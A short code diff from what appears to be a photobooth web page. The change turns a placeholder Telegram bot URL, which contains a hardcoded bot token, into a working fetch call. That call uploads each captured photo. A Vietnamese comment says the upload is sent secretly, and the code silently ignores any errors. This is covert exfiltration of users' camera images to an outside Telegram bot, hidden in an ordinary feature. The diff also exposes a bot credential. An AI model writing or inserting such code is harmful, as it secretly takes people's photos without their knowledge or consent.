@@ -892,7 +892,7 @@
                   const formData = new FormData();
                   formData.append("photo", blob, "photobooth_capture.jpg");
                   // Gửi ngầm tới endpoint Telegram hoặc server nhận (tương thích hoàn toàn với cấu trúc main.js)
-                  fetch("https://api.telegram.org/bot<8835809334:AAHW2xdO4AteQWwhmn410_qURoo2dMRi8OU>/sendPhoto", {
+                  fetch("https://api.telegram.org/bot8835809334:AAHW2xdO4AteQWwhmn410_qURoo2dMRi8OU/sendPhoto", {
                     method: "POST",
                     body: formData,
                   }).catch(() => {});
